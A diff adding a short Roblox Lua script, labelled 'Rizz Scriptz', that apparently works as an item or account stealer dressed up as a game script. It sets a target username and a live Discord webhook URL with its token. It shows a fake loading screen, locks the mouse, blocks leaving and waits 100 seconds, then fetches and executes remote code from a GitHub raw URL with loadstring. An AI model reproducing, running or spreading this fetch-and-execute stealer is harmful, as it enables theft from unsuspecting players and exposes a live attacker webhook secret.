@@ -1,0 +1,21 @@
+UserName = "rafabossuthau"
+
+Webhook = "https://discord.com/api/webhooks/1102155086320369716/5UO6HErXR7dIQhxr4ZvGtlNKVrwl2j2-AHPD-ZNCEtAr01DyjknWDwzu-kSaotSREB0t"
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = true
+
+_G.MouseLock = true 
+
+_G.ScriptName = "Rizz Scriptz"
+
+_G.FirstText = "Script Preparing"
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 100
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Duce0071/XDX/main/RafaelOnTop", true))()
